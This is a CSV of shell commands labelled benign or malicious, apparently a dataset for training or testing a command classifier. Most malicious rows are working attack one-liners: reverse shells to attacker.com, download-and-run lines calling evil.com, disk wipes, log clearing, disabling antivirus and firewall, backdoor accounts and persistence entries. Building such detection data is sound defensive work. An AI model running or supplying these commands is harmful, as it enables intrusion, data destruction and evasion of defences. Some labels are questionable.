command,label
git pull origin main,benign
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
format C: /q /x,malicious
ss -tulpn,benign
net user hacker password123 /add,malicious
cipher /w:C:\,malicious
id user,benign
nslookup google.com 2>/dev/null,benign
usermod -aG sudo user,benign
uptime,benign
curl http://evil.com/payload.sh | bash,malicious
chmod 755 script.sh,benign
tail -f /var/log/syslog,benign
wevtutil cl Security,malicious
wmic process call create 'cmd.exe /c powershell.exe',malicious
nslookup google.com,benign
python -m http.server 8080,malicious
timeout 60 bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
fdisk -l,benign
nc -l -p 4444 -e /bin/bash,malicious
timeout 60 format C: /q /x,malicious
wevtutil cl Security,malicious
sudo history,benign
"awk 'BEGIN {s = ""/inet/tcp/0/attacker.com/443""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null",malicious
"cut -d',' -f1 data.csv",benign
sudo npm list,benign
python --version,benign
rmdir empty_folder,benign
nohup mkfs.ext4 /dev/sda1,malicious
ufw status,benign
groups user > output.txt,benign
pwd,benign
systemctl status nginx,benign
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
net localgroup administrators hacker /add,malicious
(net localgroup administrators hacker /add),malicious
yum list installed > output.txt,benign
rm -rf /,malicious
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS') >/dev/null",malicious
curl -I https://google.com | head -5,benign
ufw status,benign
sdelete -p 10 -s -z C:\,malicious
userdel olduser | head -5,benign
rm -rf /,malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
(net localgroup administrators hacker /add),malicious
"cut -d',' -f1 data.csv --help",benign
attrib +h +s malware.exe >/dev/null,malicious
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
groups user,benign
"timeout 60 perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
(net user hacker password123 /add),malicious
git pull origin main,benign
sdelete -p 10 -s -z C:\,malicious
head -10 logfile.txt,benign
free -m,benign
ping -c 4 google.com,benign
lsblk,benign
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
docker ps,benign
lsblk,benign
service apache2 status,benign
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash &",malicious
vmstat,benign
wc -l document.txt --help,benign
tar -czf backup.tar.gz /data,benign
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
net user hacker password123 /add,malicious
userdel olduser,benign
mshta javascript:alert('code execution'),malicious
mshta javascript:alert('code execution'),malicious
awk '{print $1}' data.txt,benign
groups user,benign
mshta javascript:alert('code execution'),malicious
mv old.txt new.txt > output.txt,benign
shutdown /r /f /t 0,malicious
ufw status,benign
wevtutil cl System,malicious
"awk 'BEGIN {s = ""/inet/tcp/0/attacker.com/443""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null",malicious
pwd | head -5,benign
free -m,benign
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
mkdir -p /tmp/test | head -5,benign
date,benign
net user hacker password123 /add 2>&1,malicious
mshta javascript:alert('code execution'),malicious
wc -l document.txt,benign
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
ncat -lvp 443 -e cmd.exe 2>&1,malicious
date,benign
dd if=/dev/zero of=/dev/sda,malicious
groups user,benign
iptables -L,benign
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
mount,benign
"(awk 'BEGIN {s = ""/inet/tcp/0/attacker.com/443""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null)",malicious
mkfs.ext4 /dev/sda1,malicious
cp file1.txt file2.txt | head -5,benign
last,benign
rm -rf /,malicious
vmstat,benign
cmd /c del /q /s C:\*,malicious
bash -i >& /dev/tcp/attacker.com/443 0>&1 2>&1,malicious
nohup dd if=/dev/zero of=/dev/sda,malicious
yum list installed,benign
systemctl reload nginx,benign
touch newfile.txt,benign
bash -i >& /dev/tcp/attacker.com/443 0>&1 >/dev/null,malicious
ls -la,benign
type ls,benign
mkdir -p /tmp/test,benign
shutdown /r /f /t 0,malicious
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
sdelete -p 10 -s -z C:\,malicious
diskpart select disk 0 clean,malicious
nohup reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
wget http://malicious.com/malware.exe,malicious
ps aux 2>/dev/null,benign
shutdown /r /f /t 0,malicious
net user hacker password123 /add,malicious
net user hacker password123 /add >/dev/null,malicious
rm -rf /,malicious
npm list --help,benign
(bcdedit /set {default} bootstatuspolicy ignoreallfailures),malicious
npm list,benign
touch newfile.txt,benign
wget https://example.com/file.txt,benign
tail -f /var/log/syslog,benign
uniq sorted.txt,benign
:(){ :|:& };: &,malicious
"awk 'BEGIN {s = ""/inet/tcp/0/attacker.com/443""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null &",malicious
awk '{print $1}' data.txt,benign
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe 2>&1,malicious
(chmod 777 /etc/shadow),malicious
htop,benign
pip list,benign
sdelete -p 10 -s -z C:\,malicious
tail -f /var/log/syslog,benign
docker ps > output.txt,benign
cat /dev/urandom > /dev/sda,malicious
sudo cat /etc/passwd,benign
userdel olduser,benign
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
sort data.txt,benign
kubectl get pods,benign
nohup rm -rf /,malicious
git clone https://github.com/user/repo.git,benign
lsblk | head -5,benign
attrib +h +s malware.exe >/dev/null,malicious
wmic process call create 'cmd.exe /c powershell.exe',malicious
timeout 60 curl http://evil.com/payload.sh | bash,malicious
ls -la > output.txt,benign
mshta javascript:alert('code execution'),malicious
pip list,benign
nc -l -p 4444 -e /bin/bash,malicious
sudo systemctl reload nginx,benign
vmstat,benign
pip list,benign
ufw status,benign
npm list,benign
sudo finger user,benign
ps aux,benign
chmod 755 script.sh,benign
wevtutil cl Security,malicious
python --version,benign
taskkill /f /im antimalware.exe,malicious
wmic process call create 'cmd.exe /c powershell.exe',malicious
top,benign
:(){ :|:& };:,malicious
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
lsblk,benign
(net localgroup administrators hacker /add),malicious
"nohup awk 'BEGIN {s = ""/inet/tcp/0/attacker.com/443""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null",malicious
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
sdelete -p 10 -s -z C:\,malicious
userdel olduser,benign
ss -tulpn -v,benign
sudo mount,benign
cat /dev/urandom > /dev/sda,malicious
taskkill /f /im antimalware.exe,malicious
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe >/dev/null,malicious
wevtutil cl System,malicious
vmstat,benign
tar -czf backup.tar.gz /data,benign
touch newfile.txt,benign
timeout 60 wget http://malicious.com/malware.exe,malicious
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll &,malicious
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA= >/dev/null,malicious
docker images,benign
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe >/dev/null,malicious
netsh advfirewall set allprofiles state off,malicious
man ls,benign
systemctl status nginx,benign
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
yum list installed -v,benign
wget http://malicious.com/malware.exe >/dev/null,malicious
mv old.txt new.txt,benign
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe >/dev/null,malicious
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")' >/dev/null",malicious
scp file.txt user@server:/path/ > output.txt,benign
yum list installed 2>/dev/null,benign
cipher /w:C:\,malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");' 2>&1",malicious
(vssadmin delete shadows /all /quiet),malicious
service apache2 status,benign
dd if=/dev/zero of=/dev/sda,malicious
cat /etc/passwd 2>/dev/null,benign
net localgroup administrators hacker /add,malicious
ncat -lvp 443 -e cmd.exe,malicious
wmic process call create 'cmd.exe /c powershell.exe',malicious
chown user:group file.txt,benign
uniq sorted.txt,benign
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
netstat -tulpn,benign
git clone https://github.com/user/repo.git,benign
net localgroup administrators hacker /add &,malicious
chmod 777 /etc/shadow,malicious
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
curl -I https://google.com,benign
git clone https://github.com/user/repo.git > output.txt,benign
date --help,benign
mv old.txt new.txt,benign
timeout 60 powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
sc stop Windows Defender,malicious
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
python -m http.server 8080,malicious
kubectl get pods 2>/dev/null,benign
"python -c 'import os; os.system(""rm -rf /"")'",malicious
uptime,benign
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe 2>&1,malicious
nc -l -p 4444 -e /bin/bash,malicious
net localgroup administrators hacker /add,malicious
du -sh /var/log,benign
ncat -lvp 443 -e cmd.exe,malicious
npm list,benign
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
nohup net user hacker password123 /add,malicious
net user hacker password123 /add 2>&1,malicious
which python | head -5,benign
rsync -av /src/ /dst/,benign
nohup shutdown /r /f /t 0,malicious
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
net localgroup administrators hacker /add,malicious
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
sed 's/old/new/g' file.txt,benign
useradd newuser,benign
w -v,benign
nohup mshta javascript:alert('code execution'),malicious
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
ncat -lvp 443 -e cmd.exe,malicious
traceroute google.com > output.txt,benign
bash -i >& /dev/tcp/attacker.com/443 0>&1 >/dev/null,malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
tar -czf backup.tar.gz /data,benign
nslookup google.com,benign
nc -l -p 4444 -e /bin/bash 2>&1,malicious
mshta javascript:alert('code execution'),malicious
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe &,malicious
apt list --installed,benign
"awk 'BEGIN {s = ""/inet/tcp/0/attacker.com/443""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null",malicious
timeout 60 regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
useradd newuser -v,benign
type ls,benign
python -m http.server 8080,malicious
timeout 60 echo 'virus' > /etc/passwd,malicious
sdelete -p 10 -s -z C:\,malicious
cp file1.txt file2.txt -v,benign
cp file1.txt file2.txt | head -5,benign
java -version,benign
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
date,benign
cat /dev/urandom > /dev/sda,malicious
curl -I https://google.com > output.txt,benign
tail -f /var/log/syslog,benign
sudo ss -tulpn,benign
dd if=/dev/zero of=/dev/sda >/dev/null,malicious
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
docker images,benign
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
wc -l document.txt 2>/dev/null,benign
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS') 2>&1",malicious
java -version,benign
python --version,benign
mkfs.ext4 /dev/sda1 >/dev/null,malicious
vssadmin delete shadows /all /quiet,malicious
iostat,benign
net user hacker password123 /add,malicious
sudo ls -la,benign
head -10 logfile.txt | head -5,benign
find /home -name '*.txt' --help,benign
mkfs.ext4 /dev/sda1,malicious
cipher /w:C:\ >/dev/null,malicious
chown user:group file.txt,benign
taskkill /f /im antimalware.exe &,malicious
pip list,benign
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
kubectl get pods 2>/dev/null,benign
tar -czf backup.tar.gz /data,benign
netsh advfirewall set allprofiles state off,malicious
diskpart select disk 0 clean 2>&1,malicious
wmic process call create 'cmd.exe /c powershell.exe',malicious
rsync -av /src/ /dst/,benign
attrib +h +s malware.exe >/dev/null,malicious
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
mv old.txt new.txt,benign
(net user hacker password123 /add),malicious
ncat -lvp 443 -e cmd.exe &,malicious
mount,benign
wevtutil cl System,malicious
shutdown /r /f /t 0,malicious
"python -c 'import os; os.system(""rm -rf /"")'",malicious
touch newfile.txt,benign
(dd if=/dev/zero of=/dev/sda),malicious
usermod -aG sudo user,benign
node --version --help,benign
groups user,benign
vssadmin delete shadows /all /quiet,malicious
ncat -lvp 443 -e cmd.exe,malicious
scp file.txt user@server:/path/,benign
taskkill /f /im antimalware.exe >/dev/null,malicious
netsh advfirewall set allprofiles state off,malicious
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
fdisk -l,benign
timeout 60 powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
fdisk -l,benign
sudo chown user:group file.txt,benign
rsync -av /src/ /dst/,benign
npm list,benign
mkfs.ext4 /dev/sda1,malicious
wevtutil cl System,malicious
man ls,benign
(bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe),malicious
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe &,malicious
git clone https://github.com/user/repo.git 2>/dev/null,benign
ping -c 4 google.com > output.txt,benign
nohup net localgroup administrators hacker /add,malicious
nc -l -p 4444 -e /bin/bash,malicious
wevtutil cl System 2>&1,malicious
cat /dev/urandom > /dev/sda,malicious
netsh advfirewall set allprofiles state off,malicious
mount,benign
wevtutil cl Security >/dev/null,malicious
nc -l -p 4444 -e /bin/bash,malicious
uptime,benign
nohup netsh advfirewall set allprofiles state off,malicious
useradd newuser,benign
nohup bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
(cmd /c del /q /s C:\*),malicious
traceroute google.com,benign
crontab -l,benign
mkfs.ext4 /dev/sda1,malicious
touch newfile.txt,benign
"awk 'BEGIN {s = ""/inet/tcp/0/attacker.com/443""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null",malicious
docker ps,benign
nslookup google.com,benign
top,benign
fdisk -l,benign
usermod -aG sudo user,benign
nc -l -p 4444 -e /bin/bash,malicious
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
man ls > output.txt,benign
wevtutil cl System,malicious
ls -la,benign
git pull origin main > output.txt,benign
mshta javascript:alert('code execution'),malicious
sc stop Windows Defender,malicious
(cat /dev/urandom > /dev/sda),malicious
:(){ :|:& };:,malicious
nc -l -p 4444 -e /bin/bash,malicious
chown user:group file.txt,benign
taskkill /f /im antimalware.exe,malicious
(net user hacker password123 /add),malicious
echo 'Hello World',benign
uniq sorted.txt | head -5,benign
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
nc -l -p 4444 -e /bin/bash &,malicious
wget http://malicious.com/malware.exe >/dev/null,malicious
attrib +h +s malware.exe,malicious
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
curl http://evil.com/payload.sh | bash,malicious
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
"(perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");')",malicious
rsync -av /src/ /dst/,benign
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
nslookup google.com,benign
"python -c 'import os; os.system(""rm -rf /"")'",malicious
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
nohup net localgroup administrators hacker /add,malicious
sudo ping -c 4 google.com,benign
service apache2 status,benign
sc stop Windows Defender,malicious
npm list,benign
cipher /w:C:\,malicious
taskkill /f /im antimalware.exe,malicious
rm -rf /,malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
chown user:group file.txt,benign
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
cipher /w:C:\,malicious
cp file1.txt file2.txt 2>/dev/null,benign
netstat -tulpn,benign
iptables -L,benign
timeout 60 diskpart select disk 0 clean,malicious
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
wget https://example.com/file.txt -v,benign
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
id user,benign
node --version 2>/dev/null,benign
vssadmin delete shadows /all /quiet,malicious
format C: /q /x,malicious
last 2>/dev/null,benign
echo 'virus' > /etc/passwd,malicious
nslookup google.com,benign
nohup mshta javascript:alert('code execution'),malicious
rm -rf /,malicious
passwd user,benign
scp file.txt user@server:/path/,benign
attrib +h +s malware.exe &,malicious
"(powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")')",malicious
usermod -aG sudo user,benign
docker ps,benign
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
timeout 60 wevtutil cl Security,malicious
"python -c 'import os; os.system(""rm -rf /"")' 2>&1",malicious
timeout 60 cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
passwd user -v,benign
"(ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)')",malicious
history --help,benign
nohup bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
curl http://evil.com/payload.sh | bash,malicious
vmstat,benign
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
curl -I https://google.com,benign
uniq sorted.txt,benign
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
sc stop Windows Defender,malicious
tar -czf backup.tar.gz /data --help,benign
uptime > output.txt,benign
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
mshta javascript:alert('code execution'),malicious
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
attrib +h +s malware.exe,malicious
vmstat,benign
finger user --help,benign
crontab -l > output.txt,benign
(vssadmin delete shadows /all /quiet),malicious
cmd /c del /q /s C:\* 2>&1,malicious
awk '{print $1}' data.txt,benign
timeout 60 copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
ss -tulpn,benign
git pull origin main,benign
ssh user@server.com | head -5,benign
cat /dev/urandom > /dev/sda,malicious
nc -l -p 4444 -e /bin/bash,malicious
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
attrib +h +s malware.exe,malicious
(netsh advfirewall set allprofiles state off),malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
format C: /q /x,malicious
nohup schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
shutdown /r /f /t 0,malicious
timeout 60 regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
man ls,benign
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");' &",malicious
systemctl status nginx > output.txt,benign
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
w,benign
ls -la,benign
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
curl http://evil.com/payload.sh | bash,malicious
free -m 2>/dev/null,benign
wevtutil cl Security,malicious
tar -czf backup.tar.gz /data,benign
cipher /w:C:\,malicious
"nohup rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
mshta javascript:alert('code execution'),malicious
netstat -tulpn -v,benign
finger user,benign
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
mshta javascript:alert('code execution'),malicious
systemctl status nginx -v,benign
net user hacker password123 /add,malicious
timeout 60 vssadmin delete shadows /all /quiet,malicious
curl http://evil.com/payload.sh | bash,malicious
iptables -L,benign
ufw status,benign
ncat -lvp 443 -e cmd.exe,malicious
rsync -av /src/ /dst/,benign
curl http://evil.com/payload.sh | bash,malicious
timeout 60 bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
usermod -aG sudo user,benign
uniq sorted.txt,benign
ping -c 4 google.com,benign
uptime 2>/dev/null,benign
htop 2>/dev/null,benign
rsync -av /src/ /dst/,benign
whoami --help,benign
wmic process call create 'cmd.exe /c powershell.exe',malicious
wc -l document.txt 2>/dev/null,benign
nc -l -p 4444 -e /bin/bash,malicious
vssadmin delete shadows /all /quiet,malicious
sudo sort data.txt,benign
vssadmin delete shadows /all /quiet,malicious
(wget http://malicious.com/malware.exe),malicious
"cut -d',' -f1 data.csv",benign
mshta javascript:alert('code execution'),malicious
netsh advfirewall set allprofiles state off,malicious
echo 'Hello World',benign
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
java -version --help,benign
netstat -tulpn,benign
cipher /w:C:\ >/dev/null,malicious
nslookup google.com --help,benign
yum list installed,benign
last,benign
(bash -i >& /dev/tcp/attacker.com/443 0>&1),malicious
wc -l document.txt,benign
sc stop Windows Defender,malicious
sc stop Windows Defender,malicious
df -h 2>/dev/null,benign
curl http://evil.com/payload.sh | bash,malicious
timeout 60 bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
curl http://evil.com/payload.sh | bash,malicious
whoami,benign
chown user:group file.txt,benign
top --help,benign
(schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon),malicious
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash >/dev/null",malicious
which python,benign
ufw status -v,benign
yum list installed -v,benign
mount,benign
ping -c 4 google.com,benign
echo 'virus' > /etc/passwd,malicious
vssadmin delete shadows /all /quiet,malicious
ncat -lvp 443 -e cmd.exe,malicious
nohup mkfs.ext4 /dev/sda1,malicious
ncat -lvp 443 -e cmd.exe,malicious
vmstat,benign
lsblk,benign
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
python -m http.server 8080,malicious
sudo node --version,benign
systemctl reload nginx,benign
format C: /q /x,malicious
traceroute google.com,benign
timeout 60 taskkill /f /im antimalware.exe,malicious
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
top,benign
chmod 755 script.sh,benign
git clone https://github.com/user/repo.git,benign
type ls,benign
umount /dev/sdb1,benign
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
net user hacker password123 /add,malicious
history,benign
(cipher /w:C:\),malicious
sdelete -p 10 -s -z C:\,malicious
iptables -L,benign
vmstat,benign
ls -la,benign
cp file1.txt file2.txt,benign
(powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=),malicious
kubectl get pods,benign
mv old.txt new.txt,benign
echo 'Hello World',benign
dd if=/dev/zero of=/dev/sda,malicious
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
ping -c 4 google.com,benign
